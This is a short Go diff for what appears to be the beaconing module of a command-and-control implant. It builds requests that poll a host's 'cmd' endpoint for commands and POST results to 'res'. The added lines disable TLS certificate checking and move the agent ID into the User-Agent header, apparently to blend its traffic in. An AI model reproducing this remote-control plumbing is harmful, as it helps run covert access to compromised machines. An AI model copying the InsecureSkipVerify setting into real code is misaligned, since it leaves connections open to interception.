@@ -2,6 +2,7 @@ package internal
 
 import (
 	"bytes"
+	"crypto/tls"
 	"net/http"
 	"net/url"
 	"path"
@@ -14,7 +15,11 @@ type Link struct {
 }
 
 var HttpLink Link
-var client http.Client
+var client = &http.Client{
+	Transport: &http.Transport{
+		TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
+	},
+}
 
 func (l *Link) NewResultRequest(data []byte) (*http.Request, error) {
 	u, err := url.Parse(l.Host)
@@ -22,15 +27,13 @@ func (l *Link) NewResultRequest(data []byte) (*http.Request, error) {
 		return nil, err
 	}
 	u.Path = path.Join(u.Path, "res")
-	q := u.Query()
-	q.Set("id", l.Id)
-	u.RawQuery = q.Encode()
 
 	body := bytes.NewReader(data)
 	req, err := http.NewRequest("POST", u.String(), body)
 	if err != nil {
 		return nil, err
 	}
+	req.Header.Set("User-Agent", l.Id)
 	return req, nil
 }
 
@@ -54,14 +57,12 @@ func (l *Link) NewCmdRequest() (*http.Request, error) {
 		return nil, err
 	}
 	u.Path = path.Join(u.Path, "cmd")
-	q := u.Query()
-	q.Set("id", l.Id)
-	u.RawQuery = q.Encode()
 
 	req, err := http.NewRequest("GET", u.String(), nil)
 	if err != nil {
 		return nil, err
 	}
+	req.Header.Set("User-Agent", l.Id)
 	return req, nil
 }
 
